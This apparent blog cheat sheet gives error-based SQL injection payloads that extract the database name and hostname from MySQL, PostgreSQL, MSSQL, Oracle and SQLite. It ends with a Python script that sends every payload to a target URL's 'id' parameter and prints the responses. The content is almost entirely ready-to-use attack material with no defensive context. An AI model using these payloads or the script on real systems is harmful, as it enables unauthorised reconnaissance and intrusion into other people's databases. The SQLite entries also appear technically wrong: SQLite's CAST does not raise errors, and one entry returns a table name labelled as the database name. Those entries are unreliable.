---
title: "Extracting DB Name with Forced Errors"
tags: ['Hacking', 'SQLi']
date: 2024-10-03
toc: true
unlisted: true
author: 'Ren'
authorlink: 'https://about.0x0060.dev/'
---

## MySQL

### Extracting DB Name

Use error-based injection to extract the database name.

```
' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT database()), 0x3a, FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) y) --
```

### Extracting Hostname

Use error-based injection to extract the hostname.

```
' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT @@hostname), 0x3a, FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) y) --
```

## PostgreSQL

### Extracting Database Name

Use error-based injection to extract the current database name.

```
' AND 1=CAST((SELECT current_database()) AS INT) --
```

### Extracting Hostname

PostgreSQL does not directly provide a function for hostname, but you can use other metadata queries or built-in extensions like `inet_server_addr`.

```
' AND 1=CAST((SELECT inet_server_addr()) AS INT) --
```

## MSSQL

### Extracting Database Name

Use error-based injection to extract the current database name.

```
; SELECT 1 WHERE 1=CAST(DB_NAME() AS INT) --
```

### Extracting Hostname

Use error-based injection to extract the server hostname.

```
; SELECT 1 WHERE 1=CAST(@@servername AS INT) --
```

## Oracle

### Extracting Database Name

Use error-based injection to extract the current database name.

```
' UNION SELECT NULL FROM dual WHERE 1=CAST((SELECT ora_database_name FROM dual) AS INT) --
```

### Extracting Hostname

Use error-based injection to extract the hostname.

```
' UNION SELECT NULL FROM dual WHERE 1=CAST((SELECT SYS_CONTEXT('USERENV', 'HOST') FROM dual) AS INT) --
```

## SQLite

### Extracting Database Name

SQLite uses a single database per file, but you can force errors to reveal database-related information.

```
' AND 1=CAST((SELECT name FROM sqlite_master WHERE type='table' LIMIT 1) AS INT) --
```

### Extracting Hostname

SQLite does not inherently have a hostname since it’s a file-based database. However, you can infer file paths which might give clues.

```
' AND 1=CAST((SELECT file FROM pragma_database_list LIMIT 1) AS INT) --
```

## Python Script to Automate the Process

Automate the error extraction process:

```
import requests

url = "http://example.com/vulnerable.php"
payloads = [
    # MySQL
    "' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT database()), 0x3a, FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) y) -- ",
    "' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT @@hostname), 0x3a, FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) y) -- ",
    # PostgreSQL
    "' AND 1=CAST((SELECT current_database()) AS INT) -- ",
    "' AND 1=CAST((SELECT inet_server_addr()) AS INT) -- ",
    # MSSQL
    "; SELECT 1 WHERE 1=CAST(DB_NAME() AS INT) -- ",
    "; SELECT 1 WHERE 1=CAST(@@servername AS INT) -- ",
    # Oracle
    "' UNION SELECT NULL FROM dual WHERE 1=CAST((SELECT ora_database_name FROM dual) AS INT) -- ",
    "' UNION SELECT NULL FROM dual WHERE 1=CAST((SELECT SYS_CONTEXT('USERENV', 'HOST') FROM dual) AS INT) -- ",
    # SQLite
    "' AND 1=CAST((SELECT name FROM sqlite_master WHERE type='table' LIMIT 1) AS INT) -- ",
    "' AND 1=CAST((SELECT file FROM pragma_database_list LIMIT 1) AS INT) -- ",
]

for payload in payloads:
    response = requests.get(url, params={"id": payload})
    print(f"Payload: {payload}")
    print(f"Response: {response.text}\n") 
```
